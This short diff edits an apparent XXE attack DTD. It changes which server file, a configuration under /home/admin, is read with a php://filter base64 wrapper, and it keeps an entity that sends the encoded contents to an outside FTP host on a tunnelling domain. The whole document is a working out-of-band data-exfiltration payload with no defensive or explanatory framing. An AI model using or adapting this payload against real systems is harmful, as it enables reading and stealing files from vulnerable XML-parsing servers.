@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///home/admin/000-default.conf">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///home/admin/default.conf">
 <!ENTITY % inception "<!ENTITY exfil SYSTEM 'ftp://idlewog.jprq.site:33267/%data;'>">
